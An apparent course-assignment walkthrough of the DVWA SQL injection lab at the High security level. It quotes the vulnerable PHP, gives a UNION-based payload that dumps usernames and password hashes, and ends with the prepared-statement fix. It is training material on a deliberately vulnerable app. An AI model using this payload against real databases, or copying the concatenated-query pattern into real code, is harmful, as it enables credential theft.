# DVWA SQL Injection Walkthrough — High Security Level
Assignment 04 — SQL Injection Mastery

**Target Endpoint:** `http://localhost:8080/vulnerabilities/sqli/`  
**Security Level:** High  
**Form Mechanism:** Input is submitted in a secondary popup window and stored in `$_SESSION['id']`

---

## 1. Vulnerability Analysis (Source Code Review)

```php
// Source in dvwa/vulnerabilities/sqli/source/high.php:
if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( ... );
    ...
```

### Flaw Mechanics:
1. The developer moved input handling into a separate dialog to prevent simple automated crawlers from discovering the parameter.
2. The developer appended `LIMIT 1` to restrict output to one row.
3. However, `$id` is still enclosed in single quotes and concatenated into the query without parameterization!
4. An attacker can break out with a single quote and comment out the `LIMIT 1` clause using `#`.

---

## 2. Step-by-Step Exploitation Workflow

### Step 1: Open Query Dialog
1. Click the link: `"Click here to change your ID"`.
2. A popup window opens at `http://localhost:8080/vulnerabilities/sqli/session-input.php`.

### Step 2: Inject UNION Payload with Comment Termination
- **Input Value:**
  ```sql
  1' UNION SELECT user, password FROM users #
  ```
- **Click Submit:**
  The input is saved into `$_SESSION['id']`.
- **Query Executed by Server:**
  ```sql
  SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT user, password FROM users #' LIMIT 1;
  ```
  *(Notice: The `#` completely comments out the developer's trailing quote and `LIMIT 1` statement!)*

### Step 3: Refresh Main Page & View Extracted Data
1. Return to the main DVWA SQLi tab and refresh.
2. The extracted rows are rendered:
   ```html
   First name: admin
   Surname: 5f4dcc3b5aa765d61d8327deb882cf99
   ```

---

## 3. The "Impossible" Security Level (How to Secure)

```php
// Source in dvwa/vulnerabilities/sqli/source/impossible.php:
$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;');
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
$row = $stmt->fetch();
```

### Why this cannot be injected:
1. Native prepared statement with parameter binding.
2. Query structure is pre-compiled by database engine before user parameter is received.
3. Input `:id` is strictly treated as data (integer literal), completely neutralizing all SQL syntax manipulation.
